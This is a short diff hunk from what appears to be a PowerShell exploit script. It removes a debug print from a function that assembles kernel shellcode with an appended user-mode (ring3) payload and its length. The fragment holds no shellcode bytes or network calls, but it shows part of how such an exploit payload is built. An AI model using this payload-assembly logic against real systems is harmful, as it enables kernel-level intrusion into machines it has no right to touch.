@@ -99,7 +99,6 @@ return $shellcode
 
 function make_kernel_user_payload($ring3) {
     $sc = make_kernel_shellcode
-	Write-Host $sc;
     $sc += [bitconverter]::GetBytes([uint16] ($ring3.length))
     $sc += $ring3
     return $sc
